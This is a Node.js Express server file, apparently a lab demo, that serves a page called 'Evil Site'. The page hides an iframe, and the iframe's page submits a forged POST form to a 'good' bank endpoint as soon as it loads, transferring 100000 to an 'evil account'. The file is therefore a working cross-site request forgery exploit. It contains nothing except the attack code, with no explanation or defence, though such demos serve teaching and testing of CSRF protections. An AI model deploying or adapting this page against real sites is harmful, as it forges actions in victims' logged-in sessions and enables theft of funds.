const express = require("express");

const app = express();

const IP   = 'evil';
const PORT = 8080;

app.get('/', function (req,res) {
    var display = ' style="display: none;" ';
    var debug   = '';
    if (req.query.debug != undefined) {
      console.log("debug mode");
      display ="";
      debug   ="?debug";
    }
    res.send(
    '<html>' +
    '  <head>' +
    '    <title>Evil Site</title>' +
    '  </head>' +
    '  <body>' +
    '    Evil site with a hidden iframe<br/>' +
    '    <iframe src="http://evil:8080/evil_transfer'+debug+'" name="attackFrame" id="attackFrame"'+ display +' />' +
    '  </body>' +
    '</html>');
});


app.get('/evil_transfer', function (req,res) {
   var alert = '';
   if (req.query.debug != undefined) {
      alert='alert("ahi vamos...");';
   }

	
   res.send(
    '<html>' +
    '  <head>' +
    '    <script>' +
    '      function attack() {' +
    '        var form=document.getElementById("transfer");' +
    '        '+ alert +
             'form.submit();' +
    '      }' +
    '    </script>' +
    '  </head>' +
    '  <body onload="attack();">' +
    '    <form id="transfer" action="http://good:8080/transfer" method="POST">' +
    '      <input type="text" name="destination" value="evil account"/>' +
    '      <input type="text" name="amount" value="100000" />' +
    '      <input type="submit" name="steal" />' +
    '    </form>' +
    '  </body>' +
    '</html>');
});

app.listen(PORT, IP, () => {
    console.log(`Listening at ${PORT}`);
});
